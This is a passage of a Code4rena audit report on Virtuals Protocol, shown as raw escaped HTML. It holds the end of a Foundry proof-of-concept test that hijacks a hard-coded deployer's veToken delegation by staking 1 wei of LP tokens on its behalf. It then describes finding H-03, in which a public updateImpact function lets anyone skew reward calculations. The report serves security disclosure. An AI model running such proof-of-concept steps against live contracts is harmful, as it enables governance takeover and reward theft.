class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[](\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e2\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epath\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epath\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eswapExactTokensForTokens\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualAmount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e / \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e2\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epath\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblock\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etimestamp\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Add liquidity to the pool to get LP tokens\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erouter\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddLiquidity\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e),\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e),\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualAmount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e / \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e2\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ebalanceOf\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e),\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eblock\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etimestamp\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        );\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003egameDeployer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0xD38493119859b8806ff28C32c41fdd67Ef41b8Ef\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Main holder of veTokens\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eIVeToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eveToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIVeToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0x974a21754271dD3d71a16F2852F8e226a9276b3E\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eassertNotEq\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eveToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003edelegates\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003egameDeployer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Stake 1 wei of LP for gameDeployer to update delegate\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eIERC20\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eagentPair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eapprove\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eveToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eveToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003estake\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003egameDeployer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eassertEq\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eveToken\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003edelegates\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003egameDeployer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e), \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euser\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003e\u003cstrong\u003eVirtuals marked as informative\u003c/strong\u003e\u003c/p\u003e\n\u003chr\u003e\n\u003ch2 id=\"h-03-public-servicenftupdateimpact-call-leads-to-cascading-issue\" style=\"position:relative;\"\u003e\u003ca href=\"#h-03-public-servicenftupdateimpact-call-leads-to-cascading-issue\" aria-label=\"h 03 public servicenftupdateimpact call leads to cascading issue permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/F-9\"\u003e[H-03] Public \u003ccode\u003eServiceNft::updateImpact\u003c/code\u003e call leads to cascading issue\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-559\"\u003eYouCrossTheLineAlfie\u003c/a\u003e, also found by \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-350\"\u003eAstroboy\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-176\"\u003edebo\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-427\"\u003eEPSec\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-11\"\u003egmh5225\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-394\"\u003egregom\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-598\"\u003ehecker_trieu_tien\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-505\"\u003eHeyu\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-390\"\u003eholtzzx\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-575\"\u003eLeoGold\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-418\"\u003elevi_104\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-627\"\u003emaxzuvex\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-325\"\u003eoakcobalt\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-689\"\u003ePelz\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-469\"\u003ePotEater\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-827\"\u003eRorschach\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-437\"\u003eshui\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-455\"\u003esoloking\u003c/a\u003e, and \u003ca href=\"https://code4rena.com/audits/2025-04-virtuals-protocol/submissions/S-605\"\u003eTheDonH\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003eThe \u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/contribution/ServiceNft.sol#L58\"\u003e\u003ccode\u003eServiceNft::mint\u003c/code\u003e\u003c/a\u003e is designed to be \u003ca href=\"https://whitepaper.virtuals.io/about-virtuals-1/the-protocol/co-contribution-and-provenance/modular-consensus-framework\"\u003ecalled via governance\u003c/a\u003e:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"6\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eContribution Process: Contributors submit their proposals through our frontend, utilizing the modular consensus framework. Each proposal generates a contribution NFT regardless of acceptance, authenticating the submission\u0026#39;s origin.\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003eState Finality in ICV: Accepted contributions are minted as service NFTs on-chain and assigned to the appropriate Virtual address within the ICV, validating their integration into the Virtual ecosystem.\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThis function calls the \u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/contribution/ServiceNft.sol#L90\"\u003e\u003ccode\u003eServiceNft::updateImpact\u003c/code\u003e\u003c/a\u003e which sets up the impacts using the \u003ccode\u003edatasetImpactWeight\u003c/code\u003e variable:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"7\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eupdateImpact\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// . . . Rest of the code . . .\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003edatasetId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026gt; \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_impacts\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003edatasetId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003erawImpact\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e * \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edatasetImpactWeight\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) / \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e10000\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;            \u0026lt;\u0026lt;@ -- \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// datasetImpactWeight is used\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_impacts\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erawImpact\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e - \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_impacts\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003edatasetId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e];                     \u0026lt;\u0026lt;@ -- \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Affects both `proposalId` and `datasetId`\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eemit\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eSetServiceScore\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003edatasetId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_maturities\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e], \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_impacts\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003edatasetId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e]);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_maturities\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003edatasetId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e] = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003e_maturities\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eproposalId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e];\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// . . . Rest of the code . . .\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eHowever, as we can see the \u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/contribution/ServiceNft.sol#L90\"\u003e\u003ccode\u003eServiceNft::updateImpact\u003c/code\u003e\u003c/a\u003e’s visibility modifier is public, allowing anyone to call it with any \u003ccode\u003evirtualId\u003c/code\u003e/\u003ccode\u003eproposalId\u003c/code\u003e. So if the admin decides to call the \u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/contribution/ServiceNft.sol#L141\"\u003e\u003ccode\u003eServiceNft::setDatasetImpactWeight\u003c/code\u003e\u003c/a\u003e, there would be a cascading issue where users would simply update the impact accordingly to their own favour.\u003c/p\u003e\n\u003cp\u003eThere are financial incentives observed as well, described as follows:\u003c/p\u003e\n\u003col\u003e\n\u003cli\u003eThe \u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/AgentRewardV2.sol#L252\"\u003e\u003ccode\u003eAgentRewardV2::_distributeContributorRewards\u003c/code\u003e\u003c/a\u003e uses \u003ca href=\"https://github.com/code-423n4/2025-04-virtuals-protocol/blob/28e93273daec5a9c73c438e216dde04c084be452/contracts/contribution/ServiceNft.sol#L120\"\u003e\u003ccode\u003eServiceNft::getImpact\u003c/code\u003e\u003c/a\u003e call for calculating rewards; hence, allowing to gain higher rewards or provide lesser rewards to the rest.\u003c/li\u003e\n\u003c/ol\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"8\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003e_distributeContributorRewards\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003evirtualId\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        RewardSettingsCheckpoints.RewardSettings \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003esettings\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    ) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eprivate\u003c/span\u003e\u003cspan 